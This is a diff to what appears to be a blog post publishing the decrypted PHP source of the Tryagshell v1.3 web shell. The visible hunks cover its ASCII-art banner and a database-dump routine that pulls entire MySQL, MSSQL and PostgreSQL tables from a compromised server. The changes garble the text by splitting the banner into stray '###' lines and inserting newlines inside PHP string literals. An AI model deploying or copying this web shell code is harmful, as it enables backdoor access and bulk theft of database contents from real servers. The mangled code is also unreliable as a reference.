@@ -16,6 +16,7 @@ This is the encoded version of the Tryagshell (version 1.3 apparently)
 
 You can see the encrypted version here: [Tryagshell (encrypted)][1]
 
+
 ### Tryagshell v1.3 (decrypted) Source Code
 
 {% highlight php %}<?php
@@ -24,21 +25,128 @@ You can see the encrypted version here: [Tryagshell (encrypted)][1]
 /*                                     #    #        #    #
 /*                                     #   #          #   #
 /*                                    #    #          #    #
-/*                                    #   ###   ######   ###   #
-/*                                   ###   ###  #########  ###   ###
-/*                                   ###   ###  #########  ###   ###
-/*                                   ###   ###   ######   ###   ###
-/*                                   ####   ##################   ####
-/*                                   ####################################
-/*                                        #####################
-/*                                 ############ ############### ##########
-/*                                ####   ###  ###############  ###   ####
-/*                                ####   ###  ###############  ###   ####
-/*                                 ####   #  ###############  #   ####
-/*                                 ####   ###  ############  ###   ####
-/*                                  ###    #   #########   #    ###
-/*                                   ###   #    ######   #    ###
-/*                                     ###                 ###
+/*                                    #   
+###   
+###
+###   
+###   #
+/*                                   
+###   
+###  
+###
+###
+###  
+###   
+###
+/*                                   
+###   
+###  
+###
+###
+###  
+###   
+###
+/*                                   
+###   
+###   
+###
+###   
+###   
+###
+/*                                   
+####   
+###
+###
+###
+###
+###
+###   
+####
+/*                                   
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+/*                                        
+###
+###
+###
+###
+###
+###
+###
+/*                                 
+###
+###
+###
+### 
+###
+###
+###
+###
+### 
+###
+###
+####
+/*                                
+####   
+###  
+###
+###
+###
+###
+###  
+###   
+####
+/*                                
+####   
+###  
+###
+###
+###
+###
+###  
+###   
+####
+/*                                 
+####   #  
+###
+###
+###
+###
+###  #   
+####
+/*                                 
+####   
+###  
+###
+###
+###
+###  
+###   
+####
+/*                                  
+###    #   
+###
+###
+###   #    
+###
+/*                                   
+###   #    
+###
+###   #    
+###
+/*                                     
+###                 
+###
 /*
 /*
 /*
@@ -559,20 +667,28 @@ class my_sql
   {
    if(empty($table)) return 0;
    $this-&gt;dump=array();
-   $this-&gt;dump[0] = '###';
-   $this-&gt;dump[1] = '### --------------------------------------- ';
-   $this-&gt;dump[2] = '###  Created: '.date ("d/m/Y H:i:s");
-   $this-&gt;dump[3] = '### Database: '.$this-&gt;base;
-   $this-&gt;dump[4] = '###    Table: '.$table;
-   $this-&gt;dump[5] = '### --------------------------------------- ';
+   $this-&gt;dump[0] = '
+###';
+   $this-&gt;dump[1] = '
+### --------------------------------------- ';
+   $this-&gt;dump[2] = '
+###  Created: '.date ("d/m/Y H:i:s");
+   $this-&gt;dump[3] = '
+### Database: '.$this-&gt;base;
+   $this-&gt;dump[4] = '
+###    Table: '.$table;
+   $this-&gt;dump[5] = '
+### --------------------------------------- ';
    switch($this-&gt;db)
     {
           case 'MySQL':
-           $this-&gt;dump[0] = '### MySQL dump';
+           $this-&gt;dump[0] = '
+### MySQL dump';
            if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
            if(!$this-&gt;get_result()) return 0;
            $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'];
-     $this-&gt;dump[] = '### --------------------------------------- ';
+     $this-&gt;dump[] = '
+### --------------------------------------- ';
            if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
            if(!$this-&gt;get_result()) return 0;
            for($i=0;$i&lt;$this-&gt;num_rows;$i++)
@@ -582,7 +698,8 @@ class my_sql
             }
     break;
     case 'MSSQL':
-     $this-&gt;dump[0] = '### MSSQL dump';
+     $this-&gt;dump[0] = '
+### MSSQL dump';
      if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
            if(!$this-&gt;get_result()) return 0;
            for($i=0;$i&lt;$this-&gt;num_rows;$i++)
@@ -592,7 +709,8 @@ class my_sql
             }
     break;
     case 'PostgreSQL':
-     $this-&gt;dump[0] = '### PostgreSQL dump';
+     $this-&gt;dump[0] = '
+### PostgreSQL dump';
      if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
            if(!$this-&gt;get_result()) return 0;
            for($i=0;$i&lt;$this-&gt;num_rows;$i++)
@@ -602,8 +720,10 @@ class my_sql
             }
     break;
     case 'Oracle':
-      $this-&gt;dump[0] = '### ORACLE dump';
-      $this-&gt;dump[]  = '### under construction';
+      $this-&gt;dump[0] = '
+### ORACLE dump';
+      $this-&gt;dump[]  = '
+### under construction';
     break;
     default:
      return 0;
@@ -2348,6 +2468,7 @@ access.&lt;/CENTER&gt;&lt;/FONT&gt;");
 }
 ?>
 {% endhighlight %}
+
 
 ### Tryagshell v1.3 screenshot
 
